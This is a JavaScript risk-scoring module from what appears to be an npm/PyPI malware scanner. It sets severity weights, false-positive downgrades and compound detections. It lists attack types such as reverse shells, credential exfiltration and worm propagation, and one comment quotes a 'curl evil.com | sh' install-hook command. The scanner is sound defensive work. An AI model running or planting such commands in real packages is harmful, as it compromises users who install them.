const { getRule } = require('./rules/index.js');

// ============================================
// SCORING CONSTANTS
// ============================================
// Severity weights for risk score calculation (0-100)
// These values determine the impact of each threat type on the final score.
// Example: 4 CRITICAL threats = 100 (max score), 10 HIGH threats = 100
const SEVERITY_WEIGHTS = {
  // CRITICAL: Threats with immediate impact (active malware, data exfiltration)
  // High weight because a single critical threat justifies immediate action
  CRITICAL: 25,

  // HIGH: Serious threats (dangerous code, known malicious dependencies)
  // 10 HIGH threats reach the maximum score
  HIGH: 10,

  // MEDIUM: Potential threats (suspicious patterns, light obfuscation)
  // Moderate impact, requires investigation but not necessarily malicious
  MEDIUM: 3,

  // LOW: Informational findings, minimal impact on risk score
  LOW: 1
};

// Thresholds for determining the overall risk level
const RISK_THRESHOLDS = {
  CRITICAL: 75,  // >= 75: Immediate action required
  HIGH: 50,      // >= 50: Priority investigation
  MEDIUM: 25     // >= 25: Monitor
  // < 25 && > 0: LOW
  // === 0: SAFE
};

// Maximum score (capped)
const MAX_RISK_SCORE = 100;

// Cap MEDIUM prototype_hook contribution — MEDIUM hooks are framework class extensions
// (Request/Response/App/Router) which are not security risks. Capped at 15 points (5 × MEDIUM weight)
// to limit noise while preserving some signal. CRITICAL and HIGH prototype_hook findings still score normally.
const PROTO_HOOK_MEDIUM_CAP = 15;

// Confidence-weighted scoring factors (v2.7.10)
// High-confidence detections (eval, IOC, shell injection) score at full weight.
// Medium-confidence heuristics (lifecycle_script, obfuscation, high_entropy) are discounted.
// Low-confidence informational findings (possible_obfuscation, base64_in_script) are heavily discounted.
// Unknown/paranoid rules default to 1.0 (no penalty).
const CONFIDENCE_FACTORS = { high: 1.0, medium: 0.85, low: 0.6 };

// Mutable copies for configurable overrides (reset after each scan)
let _severityWeights = { ...SEVERITY_WEIGHTS };
let _riskThresholds = { ...RISK_THRESHOLDS };

/**
 * Apply config overrides to scoring parameters.
 * @param {object} config - validated config from config.js
 */
function applyConfigOverrides(config) {
  if (config.severityWeights) {
    if (config.severityWeights.critical !== undefined) _severityWeights.CRITICAL = config.severityWeights.critical;
    if (config.severityWeights.high !== undefined) _severityWeights.HIGH = config.severityWeights.high;
    if (config.severityWeights.medium !== undefined) _severityWeights.MEDIUM = config.severityWeights.medium;
    if (config.severityWeights.low !== undefined) _severityWeights.LOW = config.severityWeights.low;
  }
  if (config.riskThresholds) {
    if (config.riskThresholds.critical !== undefined) _riskThresholds.CRITICAL = config.riskThresholds.critical;
    if (config.riskThresholds.high !== undefined) _riskThresholds.HIGH = config.riskThresholds.high;
    if (config.riskThresholds.medium !== undefined) _riskThresholds.MEDIUM = config.riskThresholds.medium;
  }
}

/** Reset scoring parameters to defaults (call after each scan to prevent state leak). */
function resetConfigOverrides() {
  _severityWeights = { ...SEVERITY_WEIGHTS };
  _riskThresholds = { ...RISK_THRESHOLDS };
}

/** Get current severity weights (for enrichment in index.js). */
function getSeverityWeights() {
  return _severityWeights;
}

/** Get current risk thresholds (for external consumers). */
function getRiskThresholds() {
  return _riskThresholds;
}

// ============================================
// PER-FILE MAX SCORING (v2.2.11)
// ============================================
// Threat types classified as package-level (not tied to a specific source file).
// These are added to the package score, not grouped by file.
const PACKAGE_LEVEL_TYPES = new Set([
  'lifecycle_script', 'lifecycle_shell_pipe',
  'lifecycle_added_critical', 'lifecycle_added_high', 'lifecycle_modified',
  'known_malicious_package', 'typosquat_detected',
  'shai_hulud_marker', 'suspicious_file',
  'pypi_malicious_package', 'pypi_typosquat_detected',
  'dangerous_api_added_critical', 'dangerous_api_added_high', 'dangerous_api_added_medium',
  'publish_burst', 'publish_dormant_spike', 'publish_rapid_succession',
  'maintainer_new_suspicious', 'maintainer_sole_change',
  'sandbox_network_activity', 'sandbox_file_changes', 'sandbox_process_spawns',
  'sandbox_canary_exfiltration',
  // Compound scoring rules — package-level co-occurrences
  'lifecycle_typosquat', 'lifecycle_inline_exec', 'lifecycle_remote_require'
]);

/**
 * Classify a threat as package-level or file-level.
 * Package-level: metadata findings (package.json, node_modules, sandbox)
 * File-level: code-level findings in specific source files
 */
function isPackageLevelThreat(threat) {
  if (PACKAGE_LEVEL_TYPES.has(threat.type)) return true;
  if (threat.file === 'package.json') return true;
  if (threat.file && (threat.file.startsWith('node_modules/') || threat.file.startsWith('node_modules\\'))) return true;
  if (threat.file && threat.file.startsWith('[SANDBOX]')) return true;
  return false;
}

/**
 * Compute a risk score for a group of threats using standard weights.
 * Handles prototype_hook MEDIUM cap per group.
 * @param {Array} threats - array of threat objects (after FP reductions)
 * @returns {number} score 0-100
 */
function computeGroupScore(threats) {
  let score = 0;
  let protoHookMediumPoints = 0;

  for (const t of threats) {
    const weight = _severityWeights[t.severity] || 0;
    const rule = getRule(t.type);
    const factor = CONFIDENCE_FACTORS[rule.confidence] || 1.0;

    if (t.type === 'prototype_hook' && t.severity === 'MEDIUM') {
      protoHookMediumPoints += weight * factor;
      continue;
    }

    score += weight * factor;
  }

  score += Math.min(protoHookMediumPoints, PROTO_HOOK_MEDIUM_CAP);
  return Math.min(MAX_RISK_SCORE, Math.round(score));
}

// ============================================
// FP REDUCTION POST-PROCESSING
// ============================================
// Legitimate frameworks produce high volumes of certain threat types that
// malware never does. This function downgrades severity when the count
// exceeds thresholds only seen in legitimate codebases.
const FP_COUNT_THRESHOLDS = {
  dynamic_require: { maxCount: 10, from: 'HIGH', to: 'LOW' },
  dangerous_call_function: { maxCount: 5, from: 'MEDIUM', to: 'LOW' },
  require_cache_poison: { maxCount: 3, from: 'CRITICAL', to: 'LOW' },
  suspicious_dataflow: { maxCount: 3, to: 'LOW' },
  obfuscation_detected: { maxCount: 3, to: 'LOW' },
  module_compile_dynamic: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  module_compile: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  zlib_inflate_eval: { maxCount: 2, from: 'CRITICAL', to: 'LOW' },
  // Build tools (webpack, jest) legitimately use vm.runInThisContext for module evaluation
  vm_code_execution: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  // P4: plugin loaders legitimately use many dynamic imports (webpack, eslint, knex, gatsby)
  dynamic_import: { maxCount: 5, from: 'HIGH', to: 'LOW' },
  // P4: hash algorithms contain bit manipulation that triggers obfuscation heuristics
  js_obfuscation_pattern: { maxCount: 1, from: 'HIGH', to: 'LOW' },
  // P4: bundled credential_tampering from minified alias resolution (jspdf, lerna)
  credential_tampering: { maxCount: 5, to: 'LOW' },
  // B1 FP reduction: bundled code aliases eval/Function (sinon, storybook, vitest)
  // FP fix: also cover HIGH severity (setTimeout+stringBuildVar in minified code)
  dangerous_call_eval: { maxCount: 3, to: 'LOW' },
  // P6: HTTP client libraries (undici, aws-sdk, nodemailer, jsdom) parse Authorization/Bearer headers
  // with 3+ credential regexes. Real harvesters use 1-2 targeted regexes.
  credential_regex_harvest: { maxCount: 2, from: 'HIGH', to: 'LOW' },
  // P7: Config frameworks (pm2, nx, dotenv, aws-sdk) read 10+ env vars — not credential theft.
  // Real stealers access 1-5 targeted env vars. Count >10 = config loader pattern.
  env_access: { maxCount: 10, from: 'HIGH', to: 'LOW' },
  // P7: Bundled files with 5+ high-entropy strings are data files, not malware payloads.
  // Real payloads use 1-2 targeted encoded strings. Count >5 = bundled assets/data.
  high_entropy_string: { maxCount: 5, to: 'LOW' }
};

// Types exempt from dist/ downgrade — IOC matches, lifecycle scripts, and
// high-confidence compound detections are always real even in dist/ files
const DIST_EXEMPT_TYPES = new Set([
  'ioc_match', 'known_malicious_package', 'pypi_malicious_package', 'shai_hulud_marker',
  'lifecycle_script', 'lifecycle_shell_pipe',
  'lifecycle_added_critical', 'lifecycle_added_high', 'lifecycle_modified',
  // Compound detections — require multiple correlated signals, not single-pattern FPs
  'zlib_inflate_eval',        // zlib + base64 + eval (event-stream pattern)
  'fetch_decrypt_exec',       // fetch + decrypt + eval (steganographic chain)
  'download_exec_binary',     // download + chmod + exec (binary dropper)
  'cross_file_dataflow',      // credential read → network exfil across files
  'staged_eval_decode',       // eval(atob(...)) (explicit payload staging)
  'reverse_shell',            // net.Socket + connect + pipe (always malicious)
  // detached_credential_exfil removed from DIST_EXEMPT: in dist/ files, co-occurrence of
  // detached_process + env_access + network is coincidental bundler aggregation.
  // Kept in REACHABILITY_EXEMPT_TYPES (lifecycle invocation is valid).
  'node_modules_write',       // writeFile to node_modules/ (worm propagation)
  'npm_publish_worm',         // exec("npm publish") (worm propagation)
  // Dangerous shell commands in dist/ are real threats, never bundler output
  'dangerous_exec',
  // Compound scoring rules — co-occurrence signals, never FP
  'crypto_staged_payload', 'lifecycle_typosquat',
  'lifecycle_inline_exec', 'lifecycle_remote_require'
  // P6: remote_code_load and proxy_data_intercept removed — in bundled dist/ files,
  // fetch + eval co-occurrence is coincidental (bundler combines HTTP client + template compilation).
  // fetch_decrypt_exec (fetch+decrypt+eval triple) remains exempt — never coincidental.
]);

// Regex matching dist/build/out/output/minified/bundled file paths
// P7: added out/ and output/ — common build output directories (esbuild, custom build scripts)
const DIST_FILE_RE = /(?:^|[/\\])(?:dist|build|out|output)[/\\]|\.min\.js$|\.bundle\.js$/i;

// Bundler artifact types: get two-notch downgrade in dist/ files (CRITICAL→MEDIUM, HIGH→LOW).
// These are individual pattern signals that bundlers routinely produce (eval for globalThis,
// dynamic require for code-splitting, minification obfuscation, etc.)
const DIST_BUNDLER_ARTIFACT_TYPES = new Set([
  'dangerous_call_eval', 'dangerous_call_function',
  'dynamic_require', 'dynamic_import',
  'obfuscation_detected', 'high_entropy_string', 'possible_obfuscation',
  'js_obfuscation_pattern', 'vm_code_execution',
  'module_compile', 'module_compile_dynamic', 'unicode_variation_decoder',
  // P7: env_access in dist/ is bundled SDK config reading, not credential theft
  'env_access',
  // P8: Proxy traps in dist/ are state management frameworks (MobX, Vue reactivity, Immer),
  // not malicious data interception. Two-notch downgrade (CRITICAL→MEDIUM, HIGH→LOW).
  'proxy_data_intercept',
  // P9: fetch+eval in dist/ is Vite/Webpack code splitting (lazy chunk loading),
  // not remote code execution. Two-notch downgrade (CRITICAL→MEDIUM, HIGH→LOW).
  'remote_code_load',
  // P10: In dist/ bundles, binary file refs + crypto are coincidental bundler aggregation
  // (webpack bundles crypto utils alongside image processing). Real steganographic attacks
  // (flatmap-stream) have these at package root, not dist/. Compound (crypto_staged_payload)
  // is in DIST_EXEMPT_TYPES so the overall signal is preserved when truly malicious.
  'staged_binary_payload', 'crypto_decipher'
]);

// Types exempt from reachability downgrade — IOC matches, lifecycle, and package-level types.
// NOTE: Uses the base IOC/lifecycle exempt set, NOT full DIST_EXEMPT_TYPES.
// Compound detections (zlib_inflate_eval, staged_eval_decode, etc.) should still be
// downgraded if the file is truly unreachable, since unreachable code cannot execute.
const REACHABILITY_BASE_EXEMPT = new Set([
  'ioc_match', 'known_malicious_package', 'pypi_malicious_package', 'shai_hulud_marker',
  'lifecycle_script', 'lifecycle_shell_pipe',
  'lifecycle_added_critical', 'lifecycle_added_high', 'lifecycle_modified'
]);
const REACHABILITY_EXEMPT_TYPES = new Set([
  ...REACHABILITY_BASE_EXEMPT,
  'cross_file_dataflow',
  'typosquat_detected', 'pypi_typosquat_detected',
  'pypi_malicious_package',
  'ai_config_injection', 'ai_config_injection_compound',
  'detached_credential_exfil' // DPRK/Lazarus: invoked via lifecycle, not require/import
]);

// ============================================
// COMPOUND SCORING RULES (v2.9.2)
// ============================================
// Co-occurrences of threat types that NEVER appear in benign packages.
// Applied AFTER FP reductions to recover signals that were individually downgraded.
// Each compound injects a new CRITICAL threat when all required types are present.
const SCORING_COMPOUNDS = [
  {
    type: 'crypto_staged_payload',
    requires: ['staged_binary_payload', 'crypto_decipher'],
    severity: 'CRITICAL',
    message: 'Binary file reference + crypto decryption — steganographic payload chain (scoring compound).',
    fileFrom: 'staged_binary_payload',
    sameFile: true // Real steganographic attacks (flatmap-stream) have crypto+binary in the SAME file
  },
  {
    type: 'lifecycle_typosquat',
    requires: ['lifecycle_script', 'typosquat_detected'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook on typosquat package — dependency confusion attack vector (scoring compound).',
    fileFrom: 'typosquat_detected'
  },
  {
    type: 'lifecycle_inline_exec',
    requires: ['lifecycle_script', 'node_inline_exec'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook with inline Node execution (node -e) — install-time code execution (scoring compound).',
    fileFrom: 'node_inline_exec'
  },
  {
    type: 'lifecycle_remote_require',
    requires: ['lifecycle_script', 'network_require'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook loading remote code (require http/https) — supply chain payload delivery (scoring compound).',
    fileFrom: 'network_require'
  },
];

/**
 * Apply compound boost rules: inject synthetic CRITICAL threats when
 * co-occurring threat types indicate unambiguous malice.
 * Called AFTER applyFPReductions to recover individually-downgraded signals.
 * @param {Array} threats - deduplicated threat array (mutated in place)
 */
function applyCompoundBoosts(threats) {
  const typeSet = new Set(threats.map(t => t.type));

  // Build map of type → first file encountered (for file assignment)
  const typeFileMap = Object.create(null);
  for (const t of threats) {
    if (!typeFileMap[t.type]) {
      typeFileMap[t.type] = t.file || '(unknown)';
    }
  }

  for (const compound of SCORING_COMPOUNDS) {
    // Skip if compound already present (e.g. from a scanner)
    if (typeSet.has(compound.type)) continue;

    // Check all required types are present
    if (compound.requires.every(req => typeSet.has(req))) {
      // Severity gate: at least one component must have had original severity >= MEDIUM.
      // Uses originalSeverity (pre-FP-reduction) to prevent attackers from
      // manipulating compound gates via count-threshold or dist-file downgrades.
      const hasSignificantComponent = compound.requires.some(req =>
        threats.some(t => t.type === req && (t.originalSeverity || t.severity) !== 'LOW')
      );
      if (!hasSignificantComponent) continue;

      // Same-file constraint: all required types must appear in at least one common file.
      // Prevents cross-file coincidental matches (e.g. next.js: staged_binary_payload in
      // dist/compiled/@vercel/nft/index.js + crypto_decipher in a different file).
      if (compound.sameFile) {
        const filesByType = compound.requires.map(req =>
          new Set(threats.filter(t => t.type === req).map(t => t.file))
        );
        // Find intersection of all file sets
        const commonFiles = [...filesByType[0]].filter(f =>
          filesByType.every(s => s.has(f))
        );
        if (commonFiles.length === 0) continue;
      }

      threats.push({
        type: compound.type,
        severity: compound.severity,
        message: compound.message,
        file: typeFileMap[compound.fileFrom] || '(unknown)',
        count: 1,
        compound: true
      });
      typeSet.add(compound.type);
    }
  }
}

// Custom class prototypes that HTTP frameworks legitimately extend.
// Distinguished from dangerous core Node.js prototype hooks.
const FRAMEWORK_PROTOTYPES = ['Request', 'Response', 'App', 'Router'];
const FRAMEWORK_PROTO_RE = new RegExp(
  '^(' + FRAMEWORK_PROTOTYPES.join('|') + ')\\.prototype\\.'
);

function applyFPReductions(threats, reachableFiles, packageName, packageDeps) {
  // Initialize reductions audit trail on each threat
  // Store original severity before any FP reductions, so compound
  // severity gates can check pre-reduction severity (GAP 4b).
  for (const t of threats) {
    t.reductions = [];
    t.originalSeverity = t.severity;
  }

  // Count occurrences of each threat type (package-level, across all files)
  const typeCounts = {};
  for (const t of threats) {
    typeCounts[t.type] = (typeCounts[t.type] || 0) + 1;
  }

  const totalThreats = threats.length;

  // P4: Plugin loader pattern — packages with 5+ dynamic_require + dynamic_import combined
  // are legitimate plugin systems (webpack, eslint, karma, knex, jasmine, gatsby).
  // Threshold raised from >1 to >4 (audit fix: >1 was trivially exploitable).
  const pluginLoaderCount = (typeCounts.dynamic_require || 0) + (typeCounts.dynamic_import || 0);
  if (pluginLoaderCount > 4) {
    // Per-file: only downgrade in files that individually exceed threshold
    // Prevents attacker from distributing 5+ requires across files to downgrade all
    const perFilePluginCount = {};
    for (const t of threats) {
      if (t.type === 'dynamic_require' || t.type === 'dynamic_import') {
        const f = t.file || '(unknown)';
        perFilePluginCount[f] = (perFilePluginCount[f] || 0) + 1;
      }
    }
    for (const t of threats) {
      if ((t.type === 'dynamic_require' || t.type === 'dynamic_import') && t.severity === 'HIGH') {
        const f = t.file || '(unknown)';
        if (perFilePluginCount[f] > 4) {
          t.reductions.push({ rule: 'plugin_loader_per_file', from: 'HIGH', to: 'LOW' });
          t.severity = 'LOW';
        }
      }
    }
  }

  for (const t of threats) {
    // Count-based downgrade: if a threat type appears too many times,
    // it's a framework/plugin system, not malware.
    // Percentage guard: only downgrade if the type is < 50% of total threats.
    // When a type dominates findings (> 50%), it may be real malware, not framework noise.
    const rule = FP_COUNT_THRESHOLDS[t.type];
    if (rule && typeCounts[t.type] > rule.maxCount && (!rule.from || t.severity === rule.from)) {
      const typeRatio = typeCounts[t.type] / totalThreats;
      // suspicious_dataflow: bypass percentage guard when count exceeds threshold.
      // Packages with >3 suspicious_dataflow findings are always legitimate SDKs.
      // But a single suspicious_dataflow at 50% ratio should NOT be downgraded.
      // vm_code_execution: same logic — bypass only when count exceeds threshold.
      if (typeRatio < 0.4 ||
          (t.type === 'suspicious_dataflow' && typeCounts[t.type] > rule.maxCount) ||
          (t.type === 'vm_code_execution' && typeCounts[t.type] > rule.maxCount)) {
        t.reductions.push({ rule: 'count_threshold', from: t.severity, to: rule.to });
        t.severity = rule.to;
      }
    }

    // require_cache_poison: single-hit downgrade removed.
    // The READ/WRITE distinction in ast-detectors already handles the FP case:
    // READ-only → LOW (hot-reload, introspection), WRITE → CRITICAL (malicious replacement).
    // A single cache WRITE is genuinely malicious — no downgrade needed.
  }

  // Dilution floor: retain at least one instance at original severity per type
  // to prevent complete count-threshold dilution by injected benign patterns.
  // Only applies to types with low maxCount (≤3) and a severity constraint (from field),
  // where injection of benign patterns is feasible. High-count types (dynamic_require,
  // env_access) and unconstrained types (suspicious_dataflow) represent legitimate
  // framework patterns and should allow full downgrade.
  const restoredTypes = new Set();
  for (const t of threats) {
    const lastReduction = t.reductions?.find(r => r.rule === 'count_threshold');
    if (lastReduction && !restoredTypes.has(t.type)) {
      const rule = FP_COUNT_THRESHOLDS[t.type];
      if (rule && rule.from && rule.maxCount <= 3) {
        t.severity = lastReduction.from;
        t.reductions = t.reductions.filter(r => r.rule !== 'count_threshold');
        t.reductions.push({ rule: 'count_threshold_floor', note: 'retained one instance at original severity' });
        restoredTypes.add(t.type);
      }
    }
  }

  for (const t of threats) {

    // Prototype hook: framework class prototypes → MEDIUM
    // Core Node.js prototypes (http.IncomingMessage, net.Socket) stay CRITICAL
    // Browser/native APIs (globalThis.fetch, XMLHttpRequest) stay HIGH
    if (t.type === 'prototype_hook' && t.severity === 'HIGH' &&
        FRAMEWORK_PROTO_RE.test(t.message)) {
      t.reductions.push({ rule: 'framework_prototype', from: 'HIGH', to: 'MEDIUM' });
      t.severity = 'MEDIUM';
    }

    // HTTP client prototype whitelist: packages with >20 prototype_hook hits
    // targeting HTTP class names are legitimate HTTP clients/frameworks.
    // Audit fix: narrowed regex — 'get','delete','command' matched getCredentials, deleteAccount.
    if (t.type === 'prototype_hook' && (t.severity === 'HIGH' || t.severity === 'CRITICAL') &&
        typeCounts.prototype_hook > 20) {
      const HTTP_PROTO_RE = /\b(Request|Response|IncomingMessage|ClientRequest|ServerResponse|fetch)\b/i;
      if (HTTP_PROTO_RE.test(t.message)) {
        t.reductions.push({ rule: 'http_client_whitelist', from: t.severity, to: 'MEDIUM' });
        t.severity = 'MEDIUM';
      }
    }

    // Dist/build/minified files: severity downgrade for bundler output.
    // Compound detections are exempt (DIST_EXEMPT_TYPES).
    // Bundler artifact types (eval, dynamic_require, obfuscation) get two-notch downgrade
    // (CRITICAL→MEDIUM, HIGH→LOW) since bundlers routinely produce these patterns.
    // Other non-exempt types keep one-notch downgrade.
    if (t.file && !DIST_EXEMPT_TYPES.has(t.type) && DIST_FILE_RE.test(t.file)) {
      if (DIST_BUNDLER_ARTIFACT_TYPES.has(t.type)) {
        // Two-notch downgrade for bundler artifacts
        const fromSev = t.severity;
        if (t.severity === 'CRITICAL') t.severity = 'MEDIUM';
        else if (t.severity === 'HIGH') t.severity = 'LOW';
        else if (t.severity === 'MEDIUM') t.severity = 'LOW';
        if (t.severity !== fromSev) t.reductions.push({ rule: 'dist_file', from: fromSev, to: t.severity });
      } else {
        // One-notch downgrade for other non-exempt types
        const fromSev = t.severity;
        if (t.severity === 'CRITICAL') t.severity = 'HIGH';
        else if (t.severity === 'HIGH') t.severity = 'MEDIUM';
        else if (t.severity === 'MEDIUM') t.severity = 'LOW';
        if (t.severity !== fromSev) t.reductions.push({ rule: 'dist_file', from: fromSev, to: t.severity });
      }
    }

    // Reachability: findings in files not reachable from entry points → LOW
    // Exception: .d.ts files are never require()'d by JS but are executed by ts-node/tsx/bun.
    // Executable code in .d.ts is always malicious — exempt from unreachable downgrade.
    const isDtsFile = t.file && t.file.endsWith('.d.ts');
    if (reachableFiles && reachableFiles.size > 0 && t.file &&
        !REACHABILITY_EXEMPT_TYPES.has(t.type) &&
        !isPackageLevelThreat(t) && !isDtsFile) {
      const normalizedFile = t.file.replace(/\\/g, '/');
      if (!reachableFiles.has(normalizedFile)) {
        t.reductions.push({ rule: 'unreachable', from: t.severity, to: 'LOW' });
        t.severity = 'LOW';
        t.unreachable = true;
      }
    }

    // C2: MCP server awareness — legitimate MCP servers write to MCP config files.
    // Downgrade mcp_config_injection to MEDIUM when @modelcontextprotocol/sdk is in dependencies.
    // Only dependencies (not devDependencies) — a real MCP server must ship the SDK.
    // High-confidence compound types stay untouched (lifecycle_shell_pipe, fetch_decrypt_exec, etc.)
    if (t.type === 'mcp_config_injection' && t.severity === 'CRITICAL' &&
        packageDeps && typeof packageDeps === 'object' &&
        packageDeps['@modelcontextprotocol/sdk']) {
      t.reductions.push({ rule: 'mcp_sdk', from: 'CRITICAL', to: 'MEDIUM' });
      t.severity = 'MEDIUM';
      t.mcpSdkDowngrade = true;
    }

    // C12: AI SDK awareness — env_access on AI API keys is expected in SDK packages.
    // Downgrade env_access HIGH → MEDIUM when @modelcontextprotocol/sdk, @anthropic/sdk,
    // or openai is in dependencies AND the env var is an AI provider key.
    // Does NOT affect compound detections (intent_credential_exfil stays CRITICAL).
    if (t.type === 'env_access' && t.severity === 'HIGH' &&
        packageDeps && typeof packageDeps === 'object') {
      const hasAiSdk = packageDeps['@modelcontextprotocol/sdk'] ||
                       packageDeps['@anthropic/sdk'] ||
                       packageDeps['openai'];
      if (hasAiSdk && /\b(ANTHROPIC_API_KEY|OPENAI_API_KEY|CLAUDE_API_KEY)\b/.test(t.message)) {
        t.reductions.push({ rule: 'ai_sdk_env', from: 'HIGH', to: 'MEDIUM' });
        t.severity = 'MEDIUM';
      }
    }
  }
}

/**
 * Calculate per-file max risk score from deduplicated threats.
 * Formula: riskScore = min(100, max(file_scores + intent_bonus) + package_level_score)
 * @param {Array} deduped - deduplicated threat array
 * @param {Object} [intentResult] - optional result from buildIntentPairs()
 * @returns {Object} { riskScore, riskLevel, globalRiskScore, maxFileScore, packageScore, mostSuspiciousFile, fileScores, criticalCount, highCount, mediumCount, lowCount }
 */
function calculateRiskScore(deduped, intentResult) {
  // 1. Separate deduped threats into package-level and file-level
  const packageLevelThreats = [];
  const fileLevelThreats = [];
  for (const t of deduped) {
    if (isPackageLevelThreat(t)) {
      packageLevelThreats.push(t);
    } else {
      fileLevelThreats.push(t);
    }
  }

  // 2. Group file-level threats by file
  const fileGroups = new Map();
  for (const t of fileLevelThreats) {
    const key = t.file || '(unknown)';
    if (!fileGroups.has(key)) fileGroups.set(key, []);
    fileGroups.get(key).push(t);
  }

  // 3. Compute per-file scores and find the most suspicious file
  let maxFileScore = 0;
  let mostSuspiciousFile = null;
  const fileScores = {};
  const fileHasMediumPlus = {}; // P4: track files with MEDIUM+ threats for cross-file bonus
  for (const [file, fileThreats] of fileGroups) {
    const score = computeGroupScore(fileThreats);
    fileScores[file] = score;
    fileHasMediumPlus[file] = fileThreats.some(t => t.severity !== 'LOW');
    if (score > maxFileScore) {
      maxFileScore = score;
      mostSuspiciousFile = file;
    }
  }

  // 4. Compute package-level score (typosquat, lifecycle, dependency IOC, etc.)
  let packageScore = computeGroupScore(packageLevelThreats);
  // Floor: CRITICAL package-level threats (lifecycle_shell_pipe, IOC match) → minimum HIGH (50)
  // A single "curl evil.com | sh" in preinstall = 25 points = MEDIUM without floor.
  if (packageScore >= 25 && packageLevelThreats.some(t => t.severity === 'CRITICAL')) {
    packageScore = Math.max(packageScore, 50);
  }

  // 5. Cross-file bonus: aggregate signal from non-max files
  // A package with 3 files each scoring 20 is more suspicious than 1 file scoring 20.
  // Add 25% of each non-max file's score as a bonus, capped at 25.
  // P4: Only count files that have at least one MEDIUM+ threat.
  // Files with only LOW findings are noise in large packages and shouldn't amplify the score.
  const bonusEligibleScores = Object.entries(fileScores)
    .filter(([file]) => fileHasMediumPlus[file])
    .map(([, score]) => score)
    .sort((a, b) => b - a);
  let crossFileBonus = 0;
  if (bonusEligibleScores.length > 1) {
    for (let i = 1; i < bonusEligibleScores.length; i++) {
      crossFileBonus += Math.ceil(bonusEligibleScores[i] * 0.25);
    }
    crossFileBonus = Math.min(crossFileBonus, 25);
  }

  // 6. Intent coherence bonus: additive score from source→sink pairs
  let intentBonus = 0;
  if (intentResult && intentResult.intentScore > 0) {
    // Cap intent bonus at 30 to prevent over-inflation
    intentBonus = Math.min(intentResult.intentScore, 30);
  }

  // 7. Final score = max file score + cross-file bonus + intent bonus + package-level score, capped at 100
  const riskScore = Math.min(MAX_RISK_SCORE, maxFileScore + crossFileBonus + intentBonus + packageScore);

  // 8. Old global score for comparison (sum of ALL findings)
  const globalRiskScore = computeGroupScore(deduped);

  // 9. Severity counts (global, for summary display)
  const criticalCount = deduped.filter(t => t.severity === 'CRITICAL').length;
  const highCount = deduped.filter(t => t.severity === 'HIGH').length;
  const mediumCount = deduped.filter(t => t.severity === 'MEDIUM').length;
  const lowCount = deduped.filter(t => t.severity === 'LOW').length;

  const riskLevel = riskScore >= _riskThresholds.CRITICAL ? 'CRITICAL'
                  : riskScore >= _riskThresholds.HIGH ? 'HIGH'
                  : riskScore >= _riskThresholds.MEDIUM ? 'MEDIUM'
                  : riskScore > 0 ? 'LOW'
                  : 'SAFE';

  return {
    riskScore, riskLevel, globalRiskScore,
    maxFileScore, crossFileBonus, intentBonus, packageScore, mostSuspiciousFile, fileScores,
    criticalCount, highCount, mediumCount, lowCount
  };
}

module.exports = {
  SEVERITY_WEIGHTS, RISK_THRESHOLDS, MAX_RISK_SCORE, CONFIDENCE_FACTORS,
  isPackageLevelThreat, computeGroupScore, applyFPReductions, applyCompoundBoosts, calculateRiskScore,
  applyConfigOverrides, resetConfigOverrides, getSeverityWeights, getRiskThresholds
};
